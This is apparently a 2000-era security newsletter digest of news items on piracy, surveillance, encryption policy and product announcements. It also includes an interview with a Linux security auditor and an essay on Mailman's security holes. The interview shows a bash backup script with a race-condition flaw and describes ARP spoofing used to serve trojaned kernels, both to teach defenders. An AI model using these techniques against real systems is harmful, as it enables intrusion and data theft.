     C H I C A G O, May 4  Prosecutors today announced the indictment of a 
     global ring of suspected software thieves and five workers at chip maker 
     Intel Corp. who allegedly exchanged hardware for access to an array of 
     pirated software. A federal grand jury in Chicago indicted 17 people, 
     including a former Microsoft Corp. employee and two Europeans, for 
     allegedly infringing the copyright on more than 5,000 computer software 
     programs. Of those indicted, 12 were allegedly members of the group known 
     as Pirates with Attitudes (PWA), a software piracy ring that was 
     infiltrated by government investigators last year. Their Web site, 
     identified by prosecutors as Sentinel or WAREZ, was located on a 
     computer at the University of Sherbrooke in Quebec and accumulated software 
     that was stripped of its embedded copy protection by members. Programs 
     available for downloading to those provided access via a secure Internet 
     protocol address included operating systems, applications such as word 
     processing and data analysis, games and MP3 music files, prosecutors said. 
     Four employees of Santa Clara, California-based Intel shipped hardware to 
     the site in Canada in 1998 to give it more storage capacity. In exchange, 
     they and other Intel employees were to be given access to the pirated 
     software, which a fifth employee allegedly arranged. The company was 
     unaware of the scheme, prosecutors said. Microsoft Employee Implicated 
     Another defendant was an employee of Redmond, Washington-based Microsoft 
     Corp. who allegedly supplied bootleg copies of the software giants 
     products for the site. He also allegedly gave access to Microsofts 
     internal network to the ringleader of PWA. The alleged ringleader, Robin 
     Rothberg, 32, also known by the online moniker Marlenus, of North 
     Chelmsford, Massachusetts, was charged in February with conspiring to 
     violate the copyrights on thousands of computer programs. He has been out 
     of jail on bond but was summoned to appear in Chicago. Among those indicted 
     were alleged PWA members from Belgium and Sweden. Last year, the Justice 
     Department said it was launching an initiative to combat piracy and 
     counterfeiting of intellectual property. This is the most significant 
     investigation of copyright infringement involving the use of the Internet 
     conducted to date by the FBI, said Kathleen McChesney, head of the FBIs 
     Chicago office. If convicted, the defendants could spend five years in 
     prison and pay a $250,000 fine, or they could be ordered to pay a fine 
     totaling twice the gross gain to any defendant or twice the gross loss to 
     any victim, whichever is greater.

     intercepted without a warrant. (Uh huh, sure.)

      Brits Launch Online Spy Network Wired News Report 3:00 a.m. May. 2, 2000 
      PDT 

      
      A few weeks back, Russia's secret service agency raised privacy watchdogs' 
      hackles when it admitted it could intercept and monitor all Russian 
      Internet traffic. 

      On Sunday the British government acknowledged that it was building a 
      system that could do the same thing in Great Britain, ostensibly to help 
      catch money launderers, terrorists, pedophiles, and other criminals who do 
      business online. 

      It also could help usher in an era of Orwellian surveillance, privacy 
      advocates fear. 

      "They've taken a lead from the KGB," said Jason Catlett, president of 
      Junkbusters, an online privacy advocacy group. 

      The British system, called the Government Technical Assistance Centre, 
      will have its hub in the headquarters of the MI5, the British secret 
      service agency. All of Britain's Internet Service Providers will be 
      connected to the GTAC through dedicated lines (which they will have to pay 
      for themselves). 

      After its scheduled completion by the end of the year, the system will 
      allow British police and secret service agents to intercept every bit of 
      the country's Internet traffic. That could include email, credit card 
      transactions, banking data -- any information exchanged between computers 
      on the Web. 

      But absolutely nothing will be intercepted without a warrant, the British 
      government insists. 

      "There's no way (the security services) are going to be trawling through 
      everybody's emails," said a government spokeswoman. "Every intercept will 
      be obtained in the same way it is now: a warrant has to be signed by the 
      secretary of state." It's no different than tapping phone lines, the 
      government insisted. 

      Despite the government's assurances, legal experts warn that the system 
      could be easily abused. 

      "It sounds reasonable -- catch terrorists, criminals, and so on -- but it 
      has the potential to be particularly unreasonable," said Brian Smith, an 
      international e-commerce and banking attorney with the Washington-based 
      law firm Mayer Brown & Platt. 

      "They will know where people are putting their money, how they're 
      spending, who they're talking to." Security agents might be tempted to 
      access information without a warrant, or might obtain warrants on dubious 
      pretexts. 

      Moreover, Net users and business all over the world could potentially be 
      effected by the system. 

      "This is not just a matter for the U.K.," Smith said. "They'll be able to 
      see everything that goes through the U.K. A multinational company may be 
      sending confidential information about its business plans through the 
      U.K., and who knows what might happen? Just look at how the U.S. 
      government has used employee emails in its case against Microsoft." 

      The British government's acknowledgment of its planned system is sure to 
      re-ignite speculation about the existence of Echelon, a supposed 
      international electronic surveillance network. 

      Privacy advocates and a number of politicians are convinced that the 
      system exists, but government officials in Europe and the United States 
      have repeatedly denied it.

     Starium, a company based in Monterey, CA, plans to sell telephone

     unit is expected to be less than $100.

           Starium Promises Phone Privacy by Declan McCullagh 3:00 a.m. Aug. 12, 
           1999 PDT MONTEREY, California -- The sleepy coastal town of Monterey, 
           California, is not the kind of place where vision-fired entrepreneurs 
           come to change the world. Monterey Bay is better known for sea lions 
           than silicon, and for Cannery Row -- made famous half a century ago 
           in John Steinbeck's gritty, eponymous novel. 

      Today, the third floor of a converted sardine factory on Cannery Row is 
      home to a startup company developing what could become a new world 
      standard in privacy protection. By early 2000, Starium Inc. plans to begin 
      selling sub-US$100 telephone scrambling devices so powerful that even the 
      US government's most muscular supercomputers can't eavesdrop on wiretapped 
      conversations. 

      Such heavily armored privacy is currently available only to government and 
      corporate customers who pony up about $3,000 for STU-III secure phones 
      created by the US National Security Agency. By squeezing the same kind of 
      ultra-strong encryption into a sleek brushed-steel case about twice the 
      size of a Palm V -- and crafted by the same San Francisco designer -- 
      Starium hopes to bring crypto to the masses. 

      "Americans by nature don't like people reading over their shoulders," says 
      Lee Caplin, president and CEO of Starium. 

      True enough. But whether Americans will pay extra for privacy is open to 
      question, especially since both people in a conversation need the Starium 
      "handsets" to chat securely. 

      And there's another big obstacle: The US government has repeatedly tried 
      to keep similar products off the market unless they have a backdoor for 
      surveillance. Its export rules prevent Starium from freely shipping its 
      products overseas. 

      Starium's three co-founders -- the company has since grown to eight people 
      -- claim they're not fazed. 

      "The technology is out there. Whether they like it or not, it exists," 
      says Bernie Sardinha, Starium chief operations officer. "You cannot stop 
      progress. You cannot stop technology." 

      Starium at first planned to call its product CallGuard, but abandoned the 
      name after discovering another company owned the trademark. The firm is 
      considering VoiceSafe as another potential name. 

      Customers will use the device by plugging it into their telephone handset 
      -- a feature allowing it to work with office systems -- and plugging the 
      handset into the base of the phone. 

      At the touch of a "secure" button, the modems inside the two Starium units 
      will form a link that, theoretically, creates an untappable communications 
      channel. The units digitize, compress, filter, and encrypt voice 
      communications -- and reverse the process on the other end. 

      The Starium handset uses a 2,048-bit Diffie-Hellman algorithm for the 
      initial setup, and a 168-bit triple DES algorithm for voice encoding. The 
      four-chip unit includes a 75 MHz MIPS processor, an infrared interface, a 
      smart card port, and possibly serial, USB, and parallel interfaces, the 
      company says. The final version will operate for over 2 hours on a pair of 
      AA batteries. 

      Starium's business plan is nothing if not ambitious. In addition to 
      selling the portable units, the company wants to add crypto capabilities 
      to cell phones, faxes, and even corporate networks. Target markets include 
      the legal, medical, banking, and even political fields. 

      "I've gotten a call from the George W. Bush people for use in the 
      campaign," CEO Caplin says. 

      The company says it's working on deals with major cell phone manufacturers 
      like Ericsson and Nokia to offer the same voice-scrambling in software. 
      Newer cell phones have enough memory and a fast enough processor to handle 
      the encryption. Best of all, a software upgrade could be free. 

      "You take your phone into a mall or a kiosk and they simply burn in the 
      new flash ROM," Sardinha says. 

      The idea for Starium came from longtime cypherpunk and company co-founder 
      Eric Blossom, who was inspired by the Clinton administration's 
      now-abandoned Clipper Chip plan to devise a way to talk privately. 

      "I got interested around the time of Clipper. I was scratching my head 
      saying, 'This is offensive,'" says Blossom, a former engineer at Hewlett 
      Packard and Clarity Software. 

      Blossom created prototype devices and sold them online. But they were 
      clunky -- about the size of a desktop modem. They were also expensive, and 
      didn't sell very well. 

      The company's directors include Robert Kohn, former chief counsel for PGP 
      and Borland International, and Whitfield Diffie, distinguished engineer at 
      Sun Microsystems and co-inventor of public key cryptography.

      PcAnywhere 9.0.0 set to its default security value uses a trivial
      encryption method so user names and password are not sent directly in

      PcAnywhere weak password encryption Posted to BugTraq on 7.4.2000

      PcAnywhere 9.0.0 set to its default security value uses a trivial 
      encryption method so user names and password are not sent directly in 
      clear. Since most users have the encryption methods set to either "none" 
      or "PcAnyWhere", their password are sent with weak encryption. 

      A major concern lies in the fact that PcAnywhere can authenticate users 
      based on their NT domain accounts and passwords. When the user logs on, it 
      is prompted for its NT username and password. They are then "encrypted" 
      through the PcAnywhere method and decrypted by the host computer for 
      validation by the NT domain controller. Someone snooping on the traffic 
      between the two stations will unlock both the PcAnywhere and NT account. 
      All that without even having to go through the L0phtCrack process. 

      Version 7.0 is not at risk since no encryption is used at all. Username 
      and password are sent in clear. I haven't tested version 8 yet.

      --- Solution ---       Symantec says that this was not intended to be real 
      encryption and suggest the use of the Public or Symetric key option 
      instead. More info can be found at :

      Microsoft promised free Internet tools based on emerging privacy
      standards for controlling how much information people using the Web
      reveal.

      Microsoft plans free Net privacy tools By The Associated Press Special to 
      CNET News.com April 7, 2000, 4:50 a.m. PT TORONTO--Microsoft promised free 
      Internet tools based on emerging privacy standards for controlling how 
      much information people using the Web reveal. 

      Coming from the world's largest software company, the tools could give 
      impetus for Web sites and other companies to embrace the Platform for 
      Privacy Practices, or P3P. The World Wide Web Consortium, an Internet 
      standards group, may finalize P3P this summer. 

      Richard Purcell, Microsoft's chief privacy officer, said the tools will 
      help consumers better understand how sites track visits and pass along 
      information to other parties. 

      A formal announcement is expected in a few weeks. Purcell disclosed the 
      company's intent during an interview yesterday at the Computers, Freedom 
      and Privacy conference here, meeting through today. 

      People using the Internet are increasingly concerned about Web sites that 
      create profiles of email addresses, favorite books and clothing sizes for 
      marketing purposes. 

      Sites often disclose their intent in privacy statements that are difficult 
      to find and understand. The Microsoft tools, to be released this fall, 
      will translate such statements into machine-readable form and let Internet 
      surfers block access to sites that collect too much. 

      With the software, people using the Web can state what types of 
      information they are willing to give, as well as whether they mind sharing 
      that information with outside parties. Internet surfers will receive a 
      warning before visiting sites that go beyond that level. 

      Microsoft plans to make the tools for its browser, Internet Explorer, and 
      for the competing Netscape browsers. 

      Lorrie Cranor, who heads a P3P  

      Lorrie Cranor, chair of the P3P specification working group at the W3C, 
      discusses the proposed privacy standard.  

      working group, considered Microsoft's decision important, saying, "In 
      order for P3P to be widely used, there has to be good user software 
      available.

      "The question I always get is, 'Is Microsoft going to implement it?'" she 
      said. 

      Still, critics believe Web sites won't have incentives to join, rendering 
      such tools and standards meaningless. Jason Catlett, president of 
      Junkbusters and a critic of P3P, said wide adoption remains years away.

      Cisco Systems next week plans to ramp up its VPN security with a new
      addition to its PIX firewall line as well as an updated version of its
      Secure Policy Manager software for enterprise users.

      Cisco plans firewall addition for small businesses

      CISCO SYSTEMS NEXT week plans to ramp up its VPN (virtual private network) 
      security with a new addition to its PIX firewall line as well as an 
      updated version of its Secure Policy Manager software for enterprise 
      users. 

       

      The Cisco PIX Firewall 506 will bring a low-end offering aimed at small 
      businesses and branch offices to the company's existing firewall set. 
      Other products in the family include the PIX 515, targeted at small and 
      midsize enterprises, and the Secure PIX 520, which is designed for large 
      enterprise installations.

       

      With its newest firewall member, Cisco is attempting to tap into small 
      business environments, which -- with increasing reliance on the Internet 
      -- are seeking more powerful security solutions for remote access 
      technologies and VPN. About the size of a hardback, the PIX 506 can handle 
      throughput of 10Mbps and 3DES encryption at rates of 4Mbps, according to 
      Cisco. The 506 firewall holds a 200MHz Intel Pentium III processor, 32MB 
      of RAM, and two integrated Fast Ethernet ports. 

       

      Version 2.0 of Cisco Secure Policy Manager adds improved scalability and 
      additional support for IPsec VPN configurations in Cisco's routers and 
      firewalls. The Policy Manager lets IT managers define and audit network 
      security policies from a central location, according to the company. The 
      product also can simplify deployment of security services supported by 
      Cisco's firewalls and IOS-based VPN routers, Cisco said.

       

      The Cisco Secure PIX Firewall 506 will be available in May, priced 
      starting at $1,950. The Secure Policy Manager 2.0 will begin shipping this 
      month, priced at $7,500.

      Getting Snooped On? Too Bad by Declan McCullagh 3:00 a.m. Apr. 7, 2000 PDT 
      TORONTO -- You say you don't like browser cookies? You're not quite sure 
      if that program you download from the Net is revealing more about you than 
      it should? 

      Well, here's something to make you really nervous: In the United States, 
      it may be illegal to disable software that snoops on you. 

      The folks who came up with this idea turn out to be the large corporations 
      that helped to draft the Digital Millennium Copyright Act (DMCA), which 
      restricts some forms of tampering with copyright protection devices. 

      In some cases, that means you won't be able to turn off any surveillance 
      features it might include, according to participants in a Thursday 
      afternoon panel at the Computers, Freedom and Privacy conference. 

      "Privacy circumvention is possible only under a limited circumstance," 
      said Paul Schwartz of the Brooklyn Law School. 

      As more and more copyrighted material makes its way online, content owners 
      are turning to encryption to protect their works from widespread illicit 
      redistribution. 

      Stephen King distributed his recent novel online in encrypted form, and 
      music companies are backing Secure Digital Memory Card for audio players. 

      Privacy advocates fret that if future works are secure and thus protected 
      under the DMCA, they could reveal consumers' private behavior 
      --RealNetworks' RealJukebox player secretly did just that -- and tinkering 
      with the program to turn off the reporting mechanism would be illegal. 

      "The practical impact is it's another area we're going to be fighting 
      about," Schwartz said. 

      The DMCA, which became law in October 1998, does allow some very limited 
      forms of privacy circumvention. You're allowed to do it if the software 
      leaks "personally identifying information" about you without giving you 
      the ability to say no, and if you're not "in violation of any other law." 

      But here's the rub: Many, if not most, programs include shrink-wrap 
      licenses that prohibit reverse-engineering or altering the program. 

      Some courts have said that shrink-wrap licenses -- software license 
      agreements that don't require a signature -- are binding. If you violate 
      them, would you be able to take advantage of the DMCA's 
      privacy-circumvention loophole? 

      The answer may well be yes. "The statute is basically totally incoherent," 
      says Pam Samuelson, a professor at the University of California at 
      Berkeley and an influential copyright scholar. 

      "We're getting tortured by laws that are inherently incoherent," 
      complained Barry Steinhardt, associate director of the ACLU. 

      Violating the DMCA is a civil offense, and "willfully" violating it for 
      private financial gain is a criminal offense punishable by five years in 
      jail and a $500,000 fine.

      machine theft

      

      Bletchley Park: Centre for wartime code-breaking effort

      A 50-year-old man has been released on police bail after being questioned 
      by detectives investigating the disappearance of the Enigma encoding 
      machine.       The man, from Bedfordshire, was arrested on Tuesday and 
      released after questioning at Milton Keynes police station. 

      Police have mounted a massive search for the historic machine, which 
      cracked the Nazi Enigma code during the Second World War. 

      It was stolen in broad daylight from a glass cabinet at the Bletchley Park 
      museum on Saturday, where it was on display. 

      Police officers were preparing to trawl a lake on the estate and search 
      the mansion. 

      Thames Valley Police spokesman John Brett said: "A search of the mansion 
      and the grounds of Bletchley Park will start under the supervision of a 
      police search adviser and a team of 10 police officers. 

      
      The missing Enigma machine

      "There is a possibility that a Thames Valley Police underwater search unit 
      may be used to search the lake in Bletchley Park. 

      "It could be hidden under the stairs in the mansion, there are lots of 
      places it could be." 

      Detectives think the thief could have abandoned the Enigma machine within 
      the 50-acre grounds of the estate, or in one of the 70 rooms in the 
      mansion. 

      The museum in Milton Keynes, Buckinghamshire, was raided in full view of 
      visitors during an open day on Saturday. 

      The Enigma - one of only three in the world - is worth up to £100,000 and 
      was used by the Germans to encrypt messages sent during the Second World 
      War. 

      Bletchley Park is believed to have shortened the war by cracking the code. 

      Detectives were appealing for any visitors on Saturday who took pictures 
      or video footage to contact police in the hope they might identify the 
      thief. 

      Reward offered 

      Mr Brett urged whoever stole the machine not to be tempted to destroy the 
      evidence in the light of massive publicity. 

      He added: "If it's a prank that's gone wrong, don't destroy it because our 
      main priority is getting it back." 

      A £5,000 reward is being offered by BT, owners of part of the site in 
      Milton Keynes since World War II. 

      "It is a tragedy that the machine has been stolen," Alan White, director 
      of BT's property division, said.

      encryption software.

      Crypto Regs Challenged Again by Declan McCullagh 4:00 p.m. Apr. 4, 2000 
      PDT Privacy advocates won a preliminary victory when for the second time a 
      federal appeals court questioned restrictions on data-scrambling 
      encryption software. 

      The Sixth Circuit Court of Appeals suggested Monday that President 
      Clinton's restrictions on distributing encryption products might be 
      unconstitutional. 

      "Because computer source code is an expressive means for the exchange of 
      information and ideas about computer programming, we hold that it is 
      protected by the First Amendment," a three-judge panel said in a unanimous 
      17KB decision. 

      That decision reversed a July 1998 ruling by a federal district court. 

      And while the panel did not strike down the Clinton administration's 
      regulations, it did refer the matter back to U.S. District Judge James 
      Gwin for another hearing. Earlier Gwin had ruled the First Amendment did 
      not apply. 

      The Justice Department says source code is akin to instructions for a 
      machine, and rules governing its distribution are necessary for national 
      security reasons. 

      Now that the appeals court has ruled source code is protected by the First 
      Amendment, the government will have a much tougher time arguing it should 
      have the power to imprison a law professor for posting a book on his 
      website. 

      Peter Junger, a professor at Case Western University School of Law, sued 
      the federal government after it told him he needed a license to post a 
      chapter of his Computers and the Law textbook online. 

      The American Civil Liberties Union, which represents Junger, applauded the 
      ruling. 

      "This is a great day for programmers, computer scientists and all 
      Americans who believe that privacy and intellectual freedom should be free 
      from government control," said ACLU Legal Director Raymond Vasvari. 

      In a separate case that also challenges the criminal penalties the U.S. 
      government imposes for unauthorized encryption distribution, the 9th U.S. 
      Circuit Court of Appeals in May 1999 ruled that encryption source code was 
      speech protected by the First Amendment. 

      "We conclude that the challenged regulations allow the government to 
      restrain speech indefinitely with no clear criteria for review," the 9th 
      Circuit panel said in its decision in a case brought by math professor 
      Daniel Bernstein. 

      But it's not clear what happens next in either the Junger or Bernstein 
      cases. The Clinton administration relaxed the regulations in January, and 
      the move is likely to delay both lawsuits for some time. 

      In fact, the Commerce Department, which administers the regulations, says 
      that Bernstein no longer has anything to worry about. 

      "You ask for an advisory opinion in light of your concern that the new 
      regulations 'continue to interfere with Professor Bernstein's planned 
      scientific activities.' Your concerns are unfounded," a Commerce 
      Department Bureau of Export Administration official wrote to Bernstein's 
      lawyers in February. 

      Bernstein asked in March for a rehearing by the district court to take 
      into account the regulation changes.

      Linux Security Interview with Frank van Vliet By Benjamin D. Thomas 
      5/30/2000 16:20

      Frank van Vliet is the author of AuditFile, many security advisories, and 
      recently pointed out configuration errors on apache.org.

      We thought our readers would be interested in an interview with Frank van 
      Vliet because of the recent paper he and Peter van Dijk released outlining 
      the steps they took to compromise apache.org. Their paper does not point 
      out any new vulnerabilities, it merely shows how simple configuration 
      errors can leave a system susceptible to attack. In this interview Frank 
      explains how he audits a systems security, major pitfalls administrators 
      fall into, and how he attempts to uncover bugs. We believe that everyone 
      can learn something from this interview. Note: Frank uses the alias {}

      
      LinuxSecurity:When and how did you gain interest in security? How did you 
      gain your security knowledge?

      Frank: When I finally switched from Windows to Linux, I spent a lot of 
      time studying the Linux kernel source. When I finished that one I knew C 
      enough to start coding on my own. I started working on my first security 
      project called Auditfile. A kernel patch making it possible to restrict 
      file access per process or per binary. This enabled me to run my apache 
      webserver only allowing it to read default libraries (/lib/*, /usr/lib/*), 
      read its configuration files, htdocs (wwwroot) directory, and only 
      allowing it to write to logfiles with no further access. At the same time 
      I took over control of the security focused group RooT66 
      http://root66.nl.eu.org and I joined ShellOracle 
      http://www.shelloracle.org. I spent hours reading various texts and joined 
      Buffer0verfl0w security http://b0f.freebsd.lublin.pl I also got involved 
      with projects like SecNet http://irc.secnet.org (not finished when writing 
      this). I have done some freelance security jobs for small webhosters

      
      LinuxSecurity: When attempting to audit a systems security, what procedure 
      do you follow? Where do you begin? How do you normally gather information? 
      What comes next? 

      Frank: My approach changes as I gain more knowledge. Currently when 
      checking the security of a system, I start checking the file system (what 
      files are sundown or suidgroup, what files are accessible for what groups, 
      what files are world writable, are their any files with nonpublic 
      information world readable). Next, I try to find out what processes are 
      running as root. Of course the suid root processes are but there are also 
      crontabs or administrators around running binaries so I wrote some tools 
      live monitoring the processes running as root. When having a list of 
      binaries ran as root, I start checking every binary. Are there any known 
      security flaws in it? Are its configuration files and data files 
      accessible by nonroot? If nothing and I am really in the mood and the 
      binary isn't too big I would download the source of it (I really love 
      open-source) and read it to see if I can find any bugs in it. 

      
      LinuxSecurity: What are some of the major pitfalls Linux Administrators 
      fall into?

      Frank: It is never enough to download all patches and updates and run 
      latest versions of your software. The group Buffer0verfl0w Security I am 
      in is constantly searching for new bugs in software. 

      Most admins play with things themselves and forget permissions on files or 
      other configuration faults. These things can be like the following backup 
      script:

      #!/bin/bash       for file in /home/* do tar -czf `echo $file | sed -e 
      's/\/home\///'`.tar.gz $file mv $file.tar.gz /verysecuredirectory/backups 
      done

      Which means every home directory will be compressed into targz files in 
      the local directory then they got moved to the 
      /verysecuredirectory/backups. But because most umasks aren't set to make 
      new files 600 and most of the times it makes new files world readable, an 
      attack can gain all directories in /home if it just scans most common 
      directories the root is in for .tar.gz files and very fast copies most of 
      it to his own directories before the scripts move it (most of the time 
      this is while it is still compressing into that tar.gz file and it is 
      already readable.

      Besides those race condition bugs like the previous ones, there are also 
      administrators that store backups in world readable.

      And there are always the 'can I trust my network' things. Man in the 
      middle attacks are not very common but are very easy to perform, 
      especially when at the same network segment as the box you attack (could 
      be some other way more insecure box previously hacked). In worst case an 
      attacker on the same segment could broadcast arp who-has packets with the 
      ip of the nameserver the attacked box is using has the MAC address of my 
      NIC. That would mean when the attacked box would try to access the 
      nameserver, it will instead contact the box of the attacker and send its 
      name resolving questions. Then the attack can just reply normally except 
      for the kernel.org domain and have those names resolve to the ip of the 
      box of the attacker. Then have it set up just the same ftpserver as on any 
      other ftp kernel.org box and have it search trojaned Linux kernels and 
      then just wait for a new Linux kernel to be published.

      
      LinuxSecurity: Have you exposed any other vulnerabilities, or written any 
      programs related to security? 

      Frank: Well, I wrote auditfile (still working on a newer version, as 
      always) I mentioned in the beginning of this interview that is at 
      http://root66.nl.eu.org/karin/auditfile-1.00.tar.gz. I found a bug and 
      wrote an exploit for bugzilla http://bugzilla.mozilla.org and working on 
      some other exploits and tools at the moment.

      
      LinuxSecurity: How do you normally approach finding security 
      vulnerabilities and writing code to exploit them? 

      Frank: Every language has it's own sets of common bugs the programs can 
      have.

      For C/C++ are mostly buffer overflows. The only way to find them is to 
      check every buffer in the program and search for any functions done on 
      that buffer and check everything if there is a possibility to exploit it. 
      I wrote some perl scripts to automate a part of this task which I normally 
      use to find the buffers, sizes of those buffers and possible insecure 
      functions (like strcpy and sprintf) done on those buffers, saving me a lot 
      of time finding normal overflows. The tricky ones require reading from 
      line 1 to like $ (last line).

      For perl it are most of the time system or open functions that can be used 
      to execute commands (like system(finger $user) or open($user) where the 
      attacker can set the $user variable). So I normally search for all open, 
      system (system, exec, `, and so on) functions and check arguments to them. 
      Also database functions can be insecure.

      I know people sending random feeds to their sendmail deamon and catch 
      crashes then backtrace to see what feed caused it and then work there way 
      back from there to the bug. Perhaps someday when I am that desperate to 
      find a bug in some high profile software I would do a thing like that, 
      until then I just read and most of the time you also learn by reading.

      
      LinuxSecurity: What do you feel is the most important step in keeping a 
      network secure?

      Frank: The integrity of the network can be spoiled if only one of the 
      boxes on the network got compromised by a nontrusted person. Most networks 
      get compromised because only one insecure box was on the network.

      Administrators may want to consider an Intrusion Detection System to 
      monitor all machines on a network.

      The most important step to keep a network secure is to keep all host 
      secure, this can be done by restricting as much as possible from outside 
      to the network (like only http connections to the httpserver and only ftp 
      connections to the ftpserver and so on) and having and IDS monitoring 
      network traffic.

      
      LinuxSecurity: What do you think the most common Linux security 
      vulnerability is? How would you recommend an administrator fix this?

      Frank: The possibility of easy exploiting of buffer overflows. Most buffer 
      overflows can be stopped by patches like the nonexecutable stack 
      http://www.openwall.com/linux and packetstorm to see my 2.3.99-pre5 
      version of it) patch for the Linux kernel and compiler addons like 
      stackguard.

      
      LinuxSecurity: Do you think open-source software has the potential for 
      being more or less secure than closed-source software?

      Frank: There are two sides to this story, if the same program was 
      available in both open and close sourced version. They are insecure at the 
      same rate. But because you get the source code of the open-source program 
      it is very easy to search for bugs. Then two things happen. The bugs get 
      reported and exploits are made for those bugs. This makes the open source 
      program having less bugs then the same closed source program but also 
      there are more exploits around and there will be more bugs to be found in 
      the future. This doesn't say it is impossible to disassemble the closed 
      source program and find the bugs in that one too. Then the same happens 
      for the close source version but at a slower rate because the source is 
      harder to get and to read (would be ASM instead of easy C or some other 
      fancy language).

      Open source software is more secure than closed source because good coders 
      can use disassembling techniques on closed source programs to find 
      vulnerabilities. I would rather have the open source version so it can 
      compiled with stackguard.

      
      LinuxSecurity: What do you think motivates "black hats" to damage/destruct 
      systems?

      Frank: It is the kick of gaining access and power motivating the "black 
      hats" to hack systems. The damage and destruct is most of the times done 
      in 2 parts. One part is to make sure they keep their full access and so 
      most binaries are Trojan and so on. This can be because they are mad at 
      the company they just hacked(they wouldn?t pay them for revealing the 
      security bugs they exploited or some other in my opinion lame reason) or 
      just because they really don't care and just want to show off (like the 
      recent DDS attacks).

      
      LinuxSecurity: How do you feel about the mass-media's portrayal of 
      'hacking'?

      Frank: Most media focuses on the things done by stupid kids mass attacking 
      big servers with DDS networks or doing other stupid things. This does take 
      the heat off the real hackers. The real hackers that don't hack and don't 
      want to be disturbed at their work of endless coding and tracing through 
      programs. It was because Hardball and I wanted to make a statement about 
      consideration of configuration. The media got us a little attention, we 
      would still be unknown doing endless coding. 

      
      LinuxSecurity: What do you see is in the future for information security?

      Frank: I would love to see administrators think twice before installing 
      things on their boxes. Also, having kids on your company network is the 
      last thing you want, especially when they try to trojan your sshdeamon and 
      mess up making some boxes even unusable and forcing to full reinstall of 
      everything because you don't know what was trojanned and what was not.

      LinuxSecurity: We would like to take a moment to thank Frank for taking 
      time out of his busy schedule to share some of his experiences with us. If 
      you have any questions reguarding this interview, please feel free to drop 
      us an email. As always, if you have any ideas for other interviews, or any

      May 26, 2000 The Myth of Open Source Security by John Viega An author of 
      the open source Mailman program explains why open source is not as secure 
      as you might think  using security holes in his own code as an example.

      Open source software projects can be more secure than closed source 
      projects. However, the very things that can make open source programs 
      secure  the availability of the source code, and the fact that large 
      numbers of users are available to look for and fix security holes  can 
      also lull people into a false sense of security.

      Many eyeballs       The core open source phenomenon responsible for making 
      code secure is the "many eyeballs" effect. With lots of people 
      scrutinizing a program's source code, bugs  and security problems  are 
      more likely to be found.

      Why do programmers look at source code? Mostly for their own benefit: 
      they've found a piece of open source software useful, and they want to 
      improve or change it for their own specific needs. Sometimes too, source 
      code attracts scrutiny just to make sure it meets certain needs, even when 
      there's no intention of modifying it. Companies which require a high level 
      of security, for example, might do a code review as part of a security 
      audit. This could be done for any software product where the source is 
      available, of course, regardless of whether it's open source or produced 
      commercially. 

      
      --------------------------------------------------------------------------
      ------ Everyone using Mailman, apparently, assumed that someone else had 
      done the proper security auditing. 
      --------------------------------------------------------------------------
      ------

       
      Source code can also attract programmers' eyeballs simply for reasons of 
      personal gain. Some people may explicitly wish to find security problems 
      in the code. Perhaps they want to build a name for themselves in the 
      security community. Maybe they're motivated by altruism or a belief that 
      others should be aware of security holes. Earlier this month, for example, 
      two hackers broke into the open source Apache Software Foundation Web 
      site, posted a Microsoft logo on it, and then published an explanation of 
      how an improperly configured Apache server allowed them access. Many 
      others share information about security vulnerabilities in less intrusive 
      ways, such as posting to discussions on the Bugtraq mailing list. And, 
      unfortunately, there will probably always be some people scrutinizing 
      source code because they want an attack that no one else has  in which 
      case, you're not likely to gain much from their eyeballs.

      Eyes that look do not always see       With people motivated to look at 
      the source code for any number of reasons, it's easy to assume that open 
      source software is likely to have been carefully scrutinized, and that 
      it's secure as a result. Unfortunately, that's not necessarily true.

      Lots of things can discourage people from reviewing source code. One 
      obvious deterrent: if the code looks like a big tangled mess, you'll get 
      fewer eyeballs on it. And as we discovered while writing Mailman, the GNU 
      mailing list manager, anything that makes it harder for the average open 
      source user to hack means fewer eyeballs. We wrote Mailman in Python, 
      which is nowhere near as popular as C, and often heard from people who 
      would have liked to help with the development, but did not want to have to 
      learn Python to do it.

      People using open source programs are most likely to look at the source 
      code when they notice something they'd like to change. Unfortunately, that 
      doesn't mean the program gets free security audits by people good at such 
      things. It gets eyeballs looking at the parts of the code they want to 
      change. Often, that's only a small part of the code. What's more, 
      programmers preoccupied with adding a feature generally aren't thinking 
      much about security when they're looking at the code.

      And, unfortunately, software developers sometimes have a tendency to 
      ignore security up front and try to bolt it on afterwards. Even worse, 
      most developers don't necessarily know much about security. Many 
      programmers know a bit about buffer overflows, and are probably aware of a 
      handful of functions that should be avoided. But many of them don't 
      understand buffer overflows enough to avoid problems beyond the handful of 
      dangerous calls they know. And when it comes to flaws other than buffer 
      overflows, the problem gets worse. For example, it is common for 
      developers to use cryptography, but misapply it in ways that destroy the 
      security of a system, and it is also common for developers to add subtle 
      information leaks to their programs accidently. It's really common to use 
      encryption that is too weak and can easily be broken. It's also common for 
      people to exchange cryptography keys in a way that's actually insecure. 
      People often try to hand roll their own protocols using common 
      cryptographic primitives. But cryptographic protocols are generally more 
      complex than one would expect, and are easy to get wrong.

      Far too trusting       So despite the conventional wisdom, the fact that 
      many eyeballs are looking at a piece of software is not likely to make it 
      more secure. It is likely, however, to make people believe that it is 
      secure. The result is an open source community that is probably far too 
      trusting when it comes to security.

      
      --------------------------------------------------------------------------
      ------ Until this week, the version of Mailman which contains these 
      security holes was included in Red Hat Professional Linux version 6.2. 
      --------------------------------------------------------------------------
      ------

       
      Take the case of the open source mailing list manager Mailman, which I 
      helped write. Mailman is in use running mailing lists at an impressive 
      number of sites. For three years, until March 2000, Mailman had a handful 
      of glaring security problems in code that I wrote before I knew much about 
      security. An attacker could use these security holes to gain access to the 
      operating system on Linux computers running the program.

      These were not obscure bugs: anyone armed with the Unix command grep and 
      an iota of security knowledge could have found them in seconds. Even 
      though Mailman was downloaded and installed thousands of times during that 
      time period, no one reported a thing. I finally realized there were 
      problems as I started to learn more about security. Everyone using 
      Mailman, apparently, assumed that someone else had done the proper 
      security auditing, when, in fact, no one had.

      And if three years seems like a long time for security holes to go 
      undetected, consider the case of Kerberos, an Open Source security 
      protocol for doing authentication. According to Ken Raeburn, one of the 
      developers of the MIT Kerberos implementation, some of the buffer 
      overflows recently found in that package have been there for over ten 
      years.

      The many eyeballs approach clearly failed for Mailman. And as open source 
      programs are increasingly packaged and sold as products, users  
      particularly those who are not familiar with the open source world  may 
      well assume that the vendor they are buying the product from has done some 
      sort of security check on it.

      Until this week, for example, version 1.0 of Mailman, which contains these 
      security holes, was included in Red Hat Professional Linux version 6.2. 
